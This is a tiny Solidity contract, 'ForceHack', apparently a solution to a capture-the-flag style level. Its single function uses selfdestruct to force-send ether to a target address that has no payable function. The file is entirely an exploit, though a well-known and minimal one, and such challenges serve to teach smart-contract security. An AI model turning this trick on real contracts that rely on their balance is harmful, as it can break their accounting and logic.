// SPDX-License-Identifier: MIT LICENSE
pragma solidity ^0.8.7;

contract ForceHack {
    function sendToForce(address payable _forceAddress) public payable {
        selfdestruct(_forceAddress);
    }
}